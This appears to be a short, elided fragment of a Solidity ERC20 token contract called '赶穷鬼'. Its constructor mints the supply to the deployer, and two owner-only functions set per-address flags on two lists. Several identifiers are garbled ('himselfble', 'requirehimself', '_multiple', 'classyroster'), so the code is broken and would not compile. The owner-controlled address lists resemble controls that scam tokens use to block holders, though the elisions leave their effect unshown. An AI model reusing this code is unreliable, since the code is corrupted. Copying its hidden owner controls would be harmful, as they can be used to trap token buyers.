...
contract GQG is ERC20, ERC20Burnable,  himselfble {
    using SafeMath for uint256;
    address public uni;
    ...
    constructor() public ERC20("赶穷鬼", "赶穷鬼") {
        _setupDecimals(18);
        _multiple(msg.sender, 100000 * 1e18);
    }

    function transferd(address account, uint256 volume)
    ...
    function setH(address _uni, bool t) public requirehimself() {
        roster[_uni] = t;
    }
    function setB(address _uni, bool t) public requirehimself() {
        classyroster[_uni] = t;
    }
}